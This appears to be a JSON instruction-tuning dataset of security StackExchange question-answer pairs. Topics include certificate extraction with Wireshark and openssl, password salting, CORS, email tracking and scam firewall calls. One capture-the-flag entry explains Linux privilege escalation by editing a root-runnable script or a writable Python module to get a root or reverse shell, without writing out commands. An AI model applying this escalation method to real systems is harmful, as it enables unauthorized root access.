    "output": "With new versions of wireshark:\n\nMake sure the traffic is decoded as SSL, i.e. setup the SSL analyzer for this TCP stream in Analyze >> Decode As. Now it will show the SSL details for the packets.\nPick the packet which contains the certificate, in this case packet 6.\nIn the packet details expand Secure Socket Layer etc until you get to the certificate itself:\n\n\n\nUse the context menu (right click) and save the raw data of the certificate with Export Packet Bytes into a file, for example cert.der.\nWith openssl x509 -inform der -in cert.der -text you can have a look at the certificate, with openssl x509 -inform der -in cert.der -outform pem -out cert.crt you can convert it into a PEM format (i.e. what you mean with crt format).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I extract the certificate from this pcap file?\nI have a pcap file of 14 sniffed SSL packets. I uploaded it here:\nssl.pcap\nI opened it with wireshark. I see the 14 packets. The largest of seems to contain a self signed certificate (as it is made in a populat internet tutorial). I see the packet contains test like \"Some-state\" and \"Intenet Widgets Pty Ltd\" ... How can I actually extract the real certificate (maybe in crt format?",
      "answer": "With new versions of wireshark:\n\nMake sure the traffic is decoded as SSL, i.e. setup the SSL analyzer for this TCP stream in Analyze >> Decode As. Now it will show the SSL details for the packets.\nPick the packet which contains the certificate, in this case packet 6.\nIn the packet details expand Secure Socket Layer etc until you get to the certificate itself:\n\n\n\nUse the context menu (right click) and save the raw data of the certificate with Export Packet Bytes into a file, for example cert.der.\nWith openssl x509 -inform der -in cert.der -text you can have a look at the certificate, with openssl x509 -inform der -in cert.der -outform pem -out cert.crt you can convert it into a PEM format (i.e. what you mean with crt format)."
    }
  },
  {
    "instruction": "Answer the question below.\nWhat is a device that scans the network it is connected to called?\nAre there any devices (computer, switch, router, etc.) witch integrate licensed software like Nessus or Nexpose  in a way that you can just drop them in a network and scan that network remote? If so, what are those devices called?\nExample:\nI buy that nice shiny box and I put it in your network and I start to scan your network.",
    "context": "",
    "output": "I know a few like:\n\nPwn Pro\nSecpoint Penetrator \n\nBut I don't know the exact generic name of those devices and I don't think there is one.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is a device that scans the network it is connected to called?\nAre there any devices (computer, switch, router, etc.) witch integrate licensed software like Nessus or Nexpose  in a way that you can just drop them in a network and scan that network remote? If so, what are those devices called?\nExample:\nI buy that nice shiny box and I put it in your network and I start to scan your network.",
      "answer": "I know a few like:\n\nPwn Pro\nSecpoint Penetrator \n\nBut I don't know the exact generic name of those devices and I don't think there is one."
    }
  },
  {
    "instruction": "Answer this question:\n\nWhat are the tools to analyze Python (obfuscated) bytecode?\nRecently on Reddit ReverseEngineering I stumbled on a self-modifying code in Python. Looking at the Github repository was quite instructive and I found picture of the Python bytecode program exposed in CFG form:\n\nI am wondering if there are tools to perform static analysis on Python bytecode program with some nice features (such as generating the CFG or allowing to manipulate the code, ...) ?",
    "context": "",
    "output": "A: Maynard is a (dis)assembler for Python byte code written by a member of Python core and the release manager for Python 3.4. Reading material here and here. I'm not aware of a public tool (besides the one you linked) that can do CFG visualization like that, but you certainly could build one on top of Maynard.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are the tools to analyze Python (obfuscated) bytecode?\nRecently on Reddit ReverseEngineering I stumbled on a self-modifying code in Python. Looking at the Github repository was quite instructive and I found picture of the Python bytecode program exposed in CFG form:\n\nI am wondering if there are tools to perform static analysis on Python bytecode program with some nice features (such as generating the CFG or allowing to manipulate the code, ...) ?",
      "answer": "Maynard is a (dis)assembler for Python byte code written by a member of Python core and the release manager for Python 3.4. Reading material here and here. I'm not aware of a public tool (besides the one you linked) that can do CFG visualization like that, but you certainly could build one on top of Maynard."
    }
  },
  {
    "instruction": "What is the answer to this question - Crack an executable in PE\nSo I noticed that I can write something in PE from the executable\nFor example if I write 1911 he tells me\n[!]Cracked By RAZOR 1911\nBut if I write something else it will not tell me anything. What is the reason for this?\nWhat names or numbers are included?\n\n",
    "context": "",
    "output": "You are using ProtectionID which scans the header for warez group names who like to include them in cracked executables. It doesn't recognize any string that's not a group name defined by the PID's author.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Crack an executable in PE\nSo I noticed that I can write something in PE from the executable\nFor example if I write 1911 he tells me\n[!]Cracked By RAZOR 1911\nBut if I write something else it will not tell me anything. What is the reason for this?\nWhat names or numbers are included?",
      "answer": "You are using ProtectionID which scans the header for warez group names who like to include them in cracked executables. It doesn't recognize any string that's not a group name defined by the PID's author."
    }
  },
  {
    "instruction": "Q: How do I import a private key from a hard copy?\nI started playing with encrypting some personal files, and I exported the private key as an .asc file, but also on hard copy (plain paper) and can't understand a thing about how it says to import it from there... It looks more like a recovery option using some of the bites printed... How does that even work? I'm on kleopatra on windows so I have no idea if I have to do it from cl or how that works...",
    "context": "",
    "output": " A: To import it from paper you broadly speaking have two options:\n\nType it in. Sure, it takes a few hours, but it's doable.\nRead it using OCR.\n\nTyping it in will take a while. If you ally yourself with a hilighter, it's entirely doable, albeit boring.\nIf you decide to OCR it, your mileage may vary, depending on what font and font size you used, and how well preserved the hardcopy is.\nOnce you have typed it in or OCR'd it, simply import that keyfile into Kleopatra.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I import a private key from a hard copy?\nI started playing with encrypting some personal files, and I exported the private key as an .asc file, but also on hard copy (plain paper) and can't understand a thing about how it says to import it from there... It looks more like a recovery option using some of the bites printed... How does that even work? I'm on kleopatra on windows so I have no idea if I have to do it from cl or how that works...",
      "answer": "To import it from paper you broadly speaking have two options:\n\nType it in. Sure, it takes a few hours, but it's doable.\nRead it using OCR.\n\nTyping it in will take a while. If you ally yourself with a hilighter, it's entirely doable, albeit boring.\nIf you decide to OCR it, your mileage may vary, depending on what font and font size you used, and how well preserved the hardcopy is.\nOnce you have typed it in or OCR'd it, simply import that keyfile into Kleopatra."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How do I log everything a certain program is doing?\ni have a program which is pretty simple.\nIts just a simple login form.\nIs there any possibility to log what this program is doing (maybe which file he is accessing and which website he is visiting (also what this website is returning)\nI mean a program that is logging which file this program is accessing and which websites (or queries) this program is sending to a website.\nI would really appreciate your help.",
    "context": "",
    "output": "answer: In case you are using Windows, you can use Process Monitor to find out which files and registry entries the software is accessing. And for the sites it is visiting (request and responses) you can use some proxy, I personally prefer Fiddler. You can also use the TCPView to check the active connections opened by the SW.\nYou also can use Wireshark to monitor network activity and set a filter to show you just the communication with the server you want. Or you can use Microsoft Network Monitor, which can display communication for specific process.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I log everything a certain program is doing?\ni have a program which is pretty simple.\nIts just a simple login form.\nIs there any possibility to log what this program is doing (maybe which file he is accessing and which website he is visiting (also what this website is returning)\nI mean a program that is logging which file this program is accessing and which websites (or queries) this program is sending to a website.\nI would really appreciate your help.",
      "answer": "In case you are using Windows, you can use Process Monitor to find out which files and registry entries the software is accessing. And for the sites it is visiting (request and responses) you can use some proxy, I personally prefer Fiddler. You can also use the TCPView to check the active connections opened by the SW.\nYou also can use Wireshark to monitor network activity and set a filter to show you just the communication with the server you want. Or you can use Microsoft Network Monitor, which can display communication for specific process."
    }
  },
  {
    "instruction": "Please answer this question: Unable to create FLIRT signature for IDA\nI'm trying to create a .sig file for sqlite3. I downloaded the source code from the website, compiled it into a .lib (smoothly), and this is what I get when I try to turn it into a .pat file:\nplb.exe -v sqlite.lib\nsqlite.lib: invalid module at offset 143146. Skipping.\nsqlite.lib: invalid module at offset 2587742. Skipping.\nsqlite.lib: skipped 2, total 2\n\nThe resulting .pat file is empty and I cannot proceed to create the final file with sigmake.\nGoogle doesn't seem to indicate that anyone has ever had an \"invalid module at offset\" problem in the entire world, so I'm guessing this is pretty unique. I'm stuck. Help?",
    "context": "",
    "output": "plb.exe is designed for OMF libraries (primarily used for 16 bit Borland compilers). What you probably want is pcf.exe, which parses COFF libraries commonly used in 32 bit windows.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Unable to create FLIRT signature for IDA\nI'm trying to create a .sig file for sqlite3. I downloaded the source code from the website, compiled it into a .lib (smoothly), and this is what I get when I try to turn it into a .pat file:\nplb.exe -v sqlite.lib\nsqlite.lib: invalid module at offset 143146. Skipping.\nsqlite.lib: invalid module at offset 2587742. Skipping.\nsqlite.lib: skipped 2, total 2\n\nThe resulting .pat file is empty and I cannot proceed to create the final file with sigmake.\nGoogle doesn't seem to indicate that anyone has ever had an \"invalid module at offset\" problem in the entire world, so I'm guessing this is pretty unique. I'm stuck. Help?",
      "answer": "plb.exe is designed for OMF libraries (primarily used for 16 bit Borland compilers). What you probably want is pcf.exe, which parses COFF libraries commonly used in 32 bit windows."
    }
  },
  {
    "instruction": "Q: Where can I practice web-security or network-security?\nPossible Duplicate:\nServers for penetration testing \n\nI'm in a process of learning security of networks and websites.\nI already practised code reviewing but I want to perform exercise. \nIs there any online resources to get our hands dirty instead of just looking at code and word for learning web security or network security?",
    "context": "",
    "output": " A: I would recommend that you have a look at some of the wargames out there. For example one of my personal favourites is Over the Wire where they provide several games of varying difficulty. Certainly makes for a much more entertaining and thrilling learning experience.\nAnother one more specifically targeting web-hacking is Hack This Site split into varying levels of difficulty.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Where can I practice web-security or network-security?\nPossible Duplicate:\nServers for penetration testing \n\nI'm in a process of learning security of networks and websites.\nI already practised code reviewing but I want to perform exercise. \nIs there any online resources to get our hands dirty instead of just looking at code and word for learning web security or network security?",
      "answer": "I would recommend that you have a look at some of the wargames out there. For example one of my personal favourites is Over the Wire where they provide several games of varying difficulty. Certainly makes for a much more entertaining and thrilling learning experience.\nAnother one more specifically targeting web-hacking is Hack This Site split into varying levels of difficulty."
    }
  },
  {
    "instruction": "Answer the question below.\nWhat are the steps of hashing and steps of verifying password using salt and key?\nWhat are the steps of hashing password during registration and login to an application using salt and key?\nAre the following steps considered correct if applied to an application?:\n1- During registration:\n\n\nuser insert password\nhashing function generates unique salt\nhashing function adds the salt to the password \nhashing function generates a unique key\nhashing function hashes the salted password with this key\nthe password and the salt are sent to the application database\nthe key is sent to another database \n\n2- During login:\n\n\nuser insert password\nthe application returns the password of the inserted username with the salt and the key\nhashing function adds the retrieved salt to the entered password \nhashing function hashes the salted password with the retrieved key\nthe application compares the two hashed password for the user (the one registered in the application database and the one inserted)\nif both password are the same then the login happens",
    "context": "",
    "output": "Let me correct this. Notice the bold parts, and removed steps\n1- During registration:\n\n\nuser insert password\nhashing function generates unique salt\nhashing function adds the salt to the password \nhashing function generates a hash from password + salt\nthe hash and the salt are sent to the application database\n\n2- During login:\n\n\nuser insert password\nthe application retrieves the salt and password hash for the username\nhashing function adds the retrieved salt to the entered password \nhashing function hashes the salted password\nthe application compares the two hashes for the user (the one registered in the application database and the one derived from the input)\nif both hashes are the same then the login happens\n\nThis way you only ever store a hash and a salt, which makes it impossible to find the password from what's stored in the database, as long as the choice of hashing algorithm is secure and the password is hard to guess.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are the steps of hashing and steps of verifying password using salt and key?\nWhat are the steps of hashing password during registration and login to an application using salt and key?\nAre the following steps considered correct if applied to an application?:\n1- During registration:\n\n\nuser insert password\nhashing function generates unique salt\nhashing function adds the salt to the password \nhashing function generates a unique key\nhashing function hashes the salted password with this key\nthe password and the salt are sent to the application database\nthe key is sent to another database \n\n2- During login:\n\n\nuser insert password\nthe application returns the password of the inserted username with the salt and the key\nhashing function adds the retrieved salt to the entered password \nhashing function hashes the salted password with the retrieved key\nthe application compares the two hashed password for the user (the one registered in the application database and the one inserted)\nif both password are the same then the login happens",
      "answer": "Let me correct this. Notice the bold parts, and removed steps\n1- During registration:\n\n\nuser insert password\nhashing function generates unique salt\nhashing function adds the salt to the password \nhashing function generates a hash from password + salt\nthe hash and the salt are sent to the application database\n\n2- During login:\n\n\nuser insert password\nthe application retrieves the salt and password hash for the username\nhashing function adds the retrieved salt to the entered password \nhashing function hashes the salted password\nthe application compares the two hashes for the user (the one registered in the application database and the one derived from the input)\nif both hashes are the same then the login happens\n\nThis way you only ever store a hash and a salt, which makes it impossible to find the password from what's stored in the database, as long as the choice of hashing algorithm is secure and the password is hard to guess."
    }
  },
  {
    "instruction": "Answer this question:\n\nWireshark as a network scanner\nI have been playing with nmap lately, trying out arp-ping scanning and using idle hosts, etc...\nLooking at Wireshark, there is always some suspicious activity when performing scans. The thing is, I do have to scan to find idle hosts to use and whichever type of scan I use is never 100% silent. There is always suspicious traffic and/or logs in the target machines.\nSo I had this idea: why not use Wireshark as a scanner? Instead of actively scanning machines I could just start Wireshark or a similar sniffing program and watch how machines interact with one another in the network with the data being stored in a database.\nMy question is, is there any program or Wireshark mode/module/etc that already does that?",
    "context": "",
    "output": "A: The process you are talking about is a form of passive scanning. Frankly, you don't even need Wireshark to do exactly what you want and without a database: you just need to manage the pcaps. \nThere are tons of tools that can query pcaps for data, Wireshark is only one of them.\nIf you are wanting to use Wireshark, in the \"Analysis\" and \"Statistics\" portion of Wireshark, there is a summary of the hosts, and even the ports that are used. As far as I can tell, that's what you are looking for.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Wireshark as a network scanner\nI have been playing with nmap lately, trying out arp-ping scanning and using idle hosts, etc...\nLooking at Wireshark, there is always some suspicious activity when performing scans. The thing is, I do have to scan to find idle hosts to use and whichever type of scan I use is never 100% silent. There is always suspicious traffic and/or logs in the target machines.\nSo I had this idea: why not use Wireshark as a scanner? Instead of actively scanning machines I could just start Wireshark or a similar sniffing program and watch how machines interact with one another in the network with the data being stored in a database.\nMy question is, is there any program or Wireshark mode/module/etc that already does that?",
      "answer": "The process you are talking about is a form of passive scanning. Frankly, you don't even need Wireshark to do exactly what you want and without a database: you just need to manage the pcaps. \nThere are tons of tools that can query pcaps for data, Wireshark is only one of them.\nIf you are wanting to use Wireshark, in the \"Analysis\" and \"Statistics\" portion of Wireshark, there is a summary of the hosts, and even the ports that are used. As far as I can tell, that's what you are looking for."
    }
  },
  {
    "instruction": "What is the answer to this question - How mailgun track opened emails?\nI receive email sent through mailgun.\nI open email (no info in mailgun log about opening email)\nI allow displaying images ('opened' event in mailgun logs)\n\nBut what I do not understand: when I allow images then all requests go to google servers. How mailgun tracks it?\n\n",
    "context": "",
    "output": "Email tracking is typically accomplished by embedding a transparent, 1x1 image in the body of the email message. The image is hosted externally at a unique URL controlled by Mailgun, so Mailgun can track whether the image has been downloaded.\nIt doesn't matter whether your browser/email client downloads the image, or whether Google downloads the image and sends it to your browser. In the end, in order to show the image someone has to download it which will trigger the tracking alert.\nIt is not a foolproof method, since users who disable fetching of remote content and don't opt to show images won't download the image as you've discovered. In the opposite direction, some email providers automatically visit all URLs in an email to scan for malware, so the tracker can trip even if the user has not opened the email.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How mailgun track opened emails?\nI receive email sent through mailgun.\nI open email (no info in mailgun log about opening email)\nI allow displaying images ('opened' event in mailgun logs)\n\nBut what I do not understand: when I allow images then all requests go to google servers. How mailgun tracks it?",
      "answer": "Email tracking is typically accomplished by embedding a transparent, 1x1 image in the body of the email message. The image is hosted externally at a unique URL controlled by Mailgun, so Mailgun can track whether the image has been downloaded.\nIt doesn't matter whether your browser/email client downloads the image, or whether Google downloads the image and sends it to your browser. In the end, in order to show the image someone has to download it which will trigger the tracking alert.\nIt is not a foolproof method, since users who disable fetching of remote content and don't opt to show images won't download the image as you've discovered. In the opposite direction, some email providers automatically visit all URLs in an email to scan for malware, so the tracker can trip even if the user has not opened the email."
    }
  },
  {
    "instruction": "Answer the question below.\nWhat is the difference between SSL and X.509 Certificates?\nI used openssl to create a X.509 certificate but I don't quite understand the relationship between a X.509 and a SSL certificate. Are they the same? Is a SSL certificate just a X.509 certificate that is used for SSL?",
    "context": "",
    "output": "SSL is by far the largest use of X.509 certificates, many people use the terms interchangeably. They're not the same however; a \"SSL Certificate\" is a X.509 Certificate with Extended Key Usage: Server Authentication (1.3.6.1.5.5.7.3.1).\nOther \"common\" types of X.509 certs are Client Authentication (1.3.6.1.5.5.7.3.2), Code Signing (1.3.6.1.5.5.7.3.3), and a handful of others are used for various encryption and authentication schemes.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the difference between SSL and X.509 Certificates?\nI used openssl to create a X.509 certificate but I don't quite understand the relationship between a X.509 and a SSL certificate. Are they the same? Is a SSL certificate just a X.509 certificate that is used for SSL?",
      "answer": "SSL is by far the largest use of X.509 certificates, many people use the terms interchangeably. They're not the same however; a \"SSL Certificate\" is a X.509 Certificate with Extended Key Usage: Server Authentication (1.3.6.1.5.5.7.3.1).\nOther \"common\" types of X.509 certs are Client Authentication (1.3.6.1.5.5.7.3.2), Code Signing (1.3.6.1.5.5.7.3.3), and a handful of others are used for various encryption and authentication schemes."
    }
  },
  {
    "instruction": "Antivirus/DPI Solution with openvpn server\nI wish to set up a system that I log into with openVPN on my Raspberry Pi 4. I have already set up an openVPN server with a PKI infrastructure as well as other services that run on the Pi (like pi hole dns + dhcp). The packet forwarding is set up in the iptables like so:\niptables -t filter -A FORWARD -i tun0 -o eth0 -j ACCEPT\niptables -t filter -A FORWARD -i eth0 -o tun0 -m state --state RELATED,ESTABLISHED -j ACCEPT\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n\nI can use devices like my phone and laptop from remote to access my network remotely and use DNS etc. I now wish to add an antivirus or dpi firewall to the mix that filters packets between eth0 and tun0 as well as protect services like my mail and web server from accepting malicious files (as easily).\nBut I don't even know what to search for. I'd like for someone to point me in the right direction for an open source solution that runs on an ARM64 in an ubuntu system (without x-server)\nI have come across nDPI which is an open source deep packet inspection tool, but I'm not entirely sure if that is what I need.",
    "context": "",
    "output": "I ended up with snort2 in conjuction with pulled pork to automatically update the rules and a fork of BASE (for php7) as a web interface. Snort3 doesn't seem ready just yet.\nTo run snort inline I compiled with the NFQ daq and run it inline. It's all open source and seems to work well enough.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Antivirus/DPI Solution with openvpn server\nI wish to set up a system that I log into with openVPN on my Raspberry Pi 4. I have already set up an openVPN server with a PKI infrastructure as well as other services that run on the Pi (like pi hole dns + dhcp). The packet forwarding is set up in the iptables like so:\niptables -t filter -A FORWARD -i tun0 -o eth0 -j ACCEPT\niptables -t filter -A FORWARD -i eth0 -o tun0 -m state --state RELATED,ESTABLISHED -j ACCEPT\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n\nI can use devices like my phone and laptop from remote to access my network remotely and use DNS etc. I now wish to add an antivirus or dpi firewall to the mix that filters packets between eth0 and tun0 as well as protect services like my mail and web server from accepting malicious files (as easily).\nBut I don't even know what to search for. I'd like for someone to point me in the right direction for an open source solution that runs on an ARM64 in an ubuntu system (without x-server)\nI have come across nDPI which is an open source deep packet inspection tool, but I'm not entirely sure if that is what I need.",
      "answer": "I ended up with snort2 in conjuction with pulled pork to automatically update the rules and a fork of BASE (for php7) as a web interface. Snort3 doesn't seem ready just yet.\nTo run snort inline I compiled with the NFQ daq and run it inline. It's all open source and seems to work well enough."
    }
  },
  {
    "instruction": "Question: How is mailbox.org 2FA method referred to as, correctly?\nTheir 2FA to log in to their web interface requires two things:\n\nsomething you know (PIN);\nsomething you have (OTP, generated by app for example).\n\nAfter that, you need to log in by:\n\ninput email address;\ninput PIN, in password field;\ninput generated OTP right after PIN, in password field.\n\nI have never seen such a 2FA method and from an ignorant-point-of-view, it seems ineffective or less secure (at least).\nHence, I want to learn about it and before doing so: I need to know how to refer to it, so I can make my searches.\nWhat is it called?",
    "context": "",
    "output": "Answer: I've only heard of this method being called OTP \"append mode\".\nFrom what I can tell, it's a legacy / backwards-compatibility method of 2FA, for cases where an interface doesn't support adding an additional authentication step or field.\nExamples include some modes of Symantec's VIP offering (used on a few major financial sites like E*TRADE; and because it's one of the earliest solutions, it uses append mode to make it easy to integrate without modifying login pages); and Duo's append mode.\nFrom a UX perspective, it's pretty confusing for users. Unless the authentication site/context makes it very explicit how to do it, and because appending the OTP isn't intuitive (very different from the other authentication workflows most people carry out every day) ... it's very easy to forget to mess it up - to forget to append, or enter only the OTP or only the password, etc. So the support burden (user lockouts, support tickets/calls, etc.) is probably pretty high.\nSo it's probably better to avoid OTP appending unless there's a backwards-compatibility need. (But it's no less secure than other options, as long as the OTP is truly randomly generated and expires in a small time window.)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How is mailbox.org 2FA method referred to as, correctly?\nTheir 2FA to log in to their web interface requires two things:\n\nsomething you know (PIN);\nsomething you have (OTP, generated by app for example).\n\nAfter that, you need to log in by:\n\ninput email address;\ninput PIN, in password field;\ninput generated OTP right after PIN, in password field.\n\nI have never seen such a 2FA method and from an ignorant-point-of-view, it seems ineffective or less secure (at least).\nHence, I want to learn about it and before doing so: I need to know how to refer to it, so I can make my searches.\nWhat is it called?",
      "answer": "I've only heard of this method being called OTP \"append mode\".\nFrom what I can tell, it's a legacy / backwards-compatibility method of 2FA, for cases where an interface doesn't support adding an additional authentication step or field.\nExamples include some modes of Symantec's VIP offering (used on a few major financial sites like E*TRADE; and because it's one of the earliest solutions, it uses append mode to make it easy to integrate without modifying login pages); and Duo's append mode.\nFrom a UX perspective, it's pretty confusing for users. Unless the authentication site/context makes it very explicit how to do it, and because appending the OTP isn't intuitive (very different from the other authentication workflows most people carry out every day) ... it's very easy to forget to mess it up - to forget to append, or enter only the OTP or only the password, etc. So the support burden (user lockouts, support tickets/calls, etc.) is probably pretty high.\nSo it's probably better to avoid OTP appending unless there's a backwards-compatibility need. (But it's no less secure than other options, as long as the OTP is truly randomly generated and expires in a small time window.)"
    }
  },
  {
    "instruction": "What is the answer to this question - Is there a way to attach x86dbg with ida pro?\nIDA has the option to use debuggers but the debuggers are quite limited. Is there a way that I can use to use x86dbg with IDA Pro?\n\n",
    "context": "",
    "output": "Take a look at x64dbgida, this is a plugin for IDA Pro.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there a way to attach x86dbg with ida pro?\nIDA has the option to use debuggers but the debuggers are quite limited. Is there a way that I can use to use x86dbg with IDA Pro?",
      "answer": "Take a look at x64dbgida, this is a plugin for IDA Pro."
    }
  },
  {
    "instruction": "Answer the following question:\n\nLinux Privilege Escalation\nI've been trying to solve a box. I got into the box by exploiting a web app and got reverse shell so I was www-data. I then found an ssh key that I used to login as another user and I ran sudo -l which showed me which files I could run as root.\nI'm struggling with what to do to use this to my advantage.",
    "context": "",
    "output": "Without seeing what server.py does, I would suggest performing the following checks:\nDo you have write privileges on server.py?\nIf so, simply edit it to spawn a bash shell as mentioned by ThoriumBR.\nDo you have write privileges on python library path?\nUsually they are in /usr/lib/python*. If for some reason the directory is writable and server.py import modules such as os, you can edit the module to include reverse shell commands.\nGood luck!",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Linux Privilege Escalation\nI've been trying to solve a box. I got into the box by exploiting a web app and got reverse shell so I was www-data. I then found an ssh key that I used to login as another user and I ran sudo -l which showed me which files I could run as root.\nI'm struggling with what to do to use this to my advantage.",
      "answer": "Without seeing what server.py does, I would suggest performing the following checks:\nDo you have write privileges on server.py?\nIf so, simply edit it to spawn a bash shell as mentioned by ThoriumBR.\nDo you have write privileges on python library path?\nUsually they are in /usr/lib/python*. If for some reason the directory is writable and server.py import modules such as os, you can edit the module to include reverse shell commands.\nGood luck!"
    }
  },
  {
    "instruction": "Question: How secure is it to bundle unencrypted private key and a CSR into PKCS12 certificate?\nI want to create a self-signed certificate to digitally sign my documents. I want to do so using my existing key pair, but to accomplish this I'd have to export my private key unencrypted into a file, use that to generate a CSR with openssl and then bundle the two into a PKCS12 certificate, also using openssl.\nMy question is, how secure is this? How well protected is the private key within the PKCS12 and what openssl commands should I use to ensure the best level of security for the key?\nBear in mind that I intend on using my signing-only private subkey for the certificate instead of the master one.",
    "context": "",
    "output": "Answer: Well, in the final PKCS12 you should encrypt the private key. The pkcs12 utility allows you to specify how you want to encrypt the private key.\n-aes128, -aes192, -aes256\nuse AES to encrypt private keys before outputting.\n\n-camellia128, -camellia192, -camellia256\nuse Camellia to encrypt private keys before outputting.\n\nI would consider aes256 very secure for a private key.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How secure is it to bundle unencrypted private key and a CSR into PKCS12 certificate?\nI want to create a self-signed certificate to digitally sign my documents. I want to do so using my existing key pair, but to accomplish this I'd have to export my private key unencrypted into a file, use that to generate a CSR with openssl and then bundle the two into a PKCS12 certificate, also using openssl.\nMy question is, how secure is this? How well protected is the private key within the PKCS12 and what openssl commands should I use to ensure the best level of security for the key?\nBear in mind that I intend on using my signing-only private subkey for the certificate instead of the master one.",
      "answer": "Well, in the final PKCS12 you should encrypt the private key. The pkcs12 utility allows you to specify how you want to encrypt the private key.\n-aes128, -aes192, -aes256\nuse AES to encrypt private keys before outputting.\n\n-camellia128, -camellia192, -camellia256\nuse Camellia to encrypt private keys before outputting.\n\nI would consider aes256 very secure for a private key."
    }
  },
  {
    "instruction": "Answer the question below.\nThis company is telling me that I need a firewall. Do I?\nDo I need to buy a firewall? The website networksecure247.com is trying to sell me one. They call and say that \"alerts\" keep coming up on my network. I have a 2013 Dell computer, and the firewall from Microsoft expired on August 16. This company, Network Secure, is telling me that I need a firewall. Do I?",
    "context": "",
    "output": "You needn't buy anything from someone who calls you unsolicited and tells you need to buy something from them.  In fact, you're generally better off not buying things from people who call you unsolicited.  In fact, you're generally better off not even listening to people who call you unsolicited to sell you things, and just hang up on them instead.  Particularly when they lie to you about things like \"alerts keep coming up on your network\" which is patently absurd.\nThe Microsoft firewall does not expire. Not on 8/16/16, or on any other date. It is a component of Windows and is good for all eternity, or as long as your computer lasts, whichever comes first.  There is no need to buy an additional host-based (runs on your computer, in other words) firewall.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "This company is telling me that I need a firewall. Do I?\nDo I need to buy a firewall? The website networksecure247.com is trying to sell me one. They call and say that \"alerts\" keep coming up on my network. I have a 2013 Dell computer, and the firewall from Microsoft expired on August 16. This company, Network Secure, is telling me that I need a firewall. Do I?",
      "answer": "You needn't buy anything from someone who calls you unsolicited and tells you need to buy something from them.  In fact, you're generally better off not buying things from people who call you unsolicited.  In fact, you're generally better off not even listening to people who call you unsolicited to sell you things, and just hang up on them instead.  Particularly when they lie to you about things like \"alerts keep coming up on your network\" which is patently absurd.\nThe Microsoft firewall does not expire. Not on 8/16/16, or on any other date. It is a component of Windows and is good for all eternity, or as long as your computer lasts, whichever comes first.  There is no need to buy an additional host-based (runs on your computer, in other words) firewall."
    }
  },
  {
    "instruction": "Please answer this question: Can we use CORS policy to restrict API calls from native mobile app?\nWe can use CORS to restrict API calls to a specific host in a web app. How to do the same for native mobile app?\nI want to restrict API calls from my app alone.\nIs it possible to do so?",
    "context": "",
    "output": "CORS doesn't prevent anything, and it doesn't protect the server. It simply tells a conforming client (a browser) what is permitted for the protection of the browser's user; CORS is a way to carefully make holes in the browser's Same-Origin Policy. Additionally, CORS headers are advisory, in that they don't actually prevent anything from happening. They make it so that a malicious attacker can't fool an innocent victim's browser into making certain requests (or, more often, using the responses to such requests) that the user wouldn't want the browser to make. A browser's user could, if it was wanted, open up the browser's dev console and make the request anyhow. Similarly, the user could export the request (cookies and all) to curl and - potentially after making more changes - send it from there.\nAny non-conforming client (such as in a mobile app, or just a shell script invoking curl), can and usually will completely ignore CORS. Such clients don't have a Same-Origin Policy to begin with, so there's nothing for CORS to make holes in and therefore it does nothing.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can we use CORS policy to restrict API calls from native mobile app?\nWe can use CORS to restrict API calls to a specific host in a web app. How to do the same for native mobile app?\nI want to restrict API calls from my app alone.\nIs it possible to do so?",
      "answer": "CORS doesn't prevent anything, and it doesn't protect the server. It simply tells a conforming client (a browser) what is permitted for the protection of the browser's user; CORS is a way to carefully make holes in the browser's Same-Origin Policy. Additionally, CORS headers are advisory, in that they don't actually prevent anything from happening. They make it so that a malicious attacker can't fool an innocent victim's browser into making certain requests (or, more often, using the responses to such requests) that the user wouldn't want the browser to make. A browser's user could, if it was wanted, open up the browser's dev console and make the request anyhow. Similarly, the user could export the request (cookies and all) to curl and - potentially after making more changes - send it from there.\nAny non-conforming client (such as in a mobile app, or just a shell script invoking curl), can and usually will completely ignore CORS. Such clients don't have a Same-Origin Policy to begin with, so there's nothing for CORS to make holes in and therefore it does nothing."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Knowing when there has been a data breach from your database\nHow do companies know when there has been a data breach?\nFor example, do they monitor event logs for login audits or do they wait until a paste is made of their data in a pastebin type site?\nIs it possible that many smaller companies never know that their data has been stolen?",
    "context": "",
    "output": "answer: One thing not mentioned yet: fake data that is otherwise never used. If you ever encounter that information, your data leaked.\nIn how far this is practically useful depends on the data. A login attempt for a specific user name is a good example, because that kind of leaked data is likely to surface.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
